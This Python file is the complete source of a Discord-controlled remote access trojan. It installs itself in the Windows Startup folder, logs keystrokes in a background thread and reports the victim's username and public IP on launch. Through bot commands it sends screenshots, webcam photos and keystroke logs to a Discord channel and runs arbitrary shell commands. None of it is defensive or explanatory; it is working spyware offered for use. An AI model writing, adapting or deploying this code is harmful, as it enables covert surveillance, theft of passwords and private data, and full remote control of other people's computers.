import discord
from discord.ext import commands
import cv2
import pyautogui
import os
import subprocess
import requests
import mss
import platform
import shutil
import sys
import threading
from pynput import keyboard

# --- CONFIG ---
TOKEN = ''
intents = discord.Intents.all()
bot = commands.Bot(command_prefix=".", intents=intents)

# Global for keylogger
log = ""

# --- 1. PERSISTENCE ---
def add_to_startup():
    file_path = os.path.realpath(sys.argv[0])
    startup_path = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
    target_file = os.path.join(startup_path, os.path.basename(file_path))
    if not os.path.exists(target_file):
        try: shutil.copy(file_path, startup_path)
        except: pass

# --- 2. KEYLOGGER ENGINE ---
def on_press(key):
    global log 
    try: log += str(key.char)
    except AttributeError:
        if key == keyboard.Key.space: log += " "
        else: log += f" [{str(key)}] "

def start_keylogger():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# --- 3. BOT COMMANDS ---
@bot.event
async def on_ready():
    user_info = f"**PC Online:** `{os.getlogin()}` | **IP:** `{requests.get('https://api.ipify.org').text}`"
    # Find the first text channel the bot can talk in
    for guild in bot.guilds:
        for channel in guild.text_channels:
            await channel.send(user_info)
            break

@bot.command()
async def whoami(ctx):
    info = f"**User:** `{os.getlogin()}`\n**OS:** `{platform.system()} {platform.release()}`\n**Node:** `{platform.node()}`"
    await ctx.send(info)

@bot.command()
async def screen(ctx):
    with mss.mss() as sct:
        sct.shot(output="s.png")
        await ctx.send(file=discord.File("s.png"))
        os.remove("s.png")

@bot.command()
async def cam(ctx):
    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    if ret:
        cv2.imwrite("c.png", frame)
        await ctx.send(file=discord.File("c.png"))
        os.remove("c.png")
    cap.release()

@bot.command()
async def keys(ctx):
    global log
    if log == "": await ctx.send("No keys logged yet.")
    else:
        await ctx.send(f"**Logs:**\n```\n{log[:1900]}\n```")
        log = ""

@bot.command()
async def shell(ctx, *, cmd):
    output = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    res = output.stdout.read() + output.stderr.read()
    await ctx.send(f"```\n{res.decode('utf-8', errors='ignore')[:1900]}\n```")

# --- STARTUP ---
if __name__ == "__main__":
    add_to_startup()
    # Run Keylogger in a background thread
    threading.Thread(target=start_keylogger, daemon=True).start()
    bot.run(TOKEN)
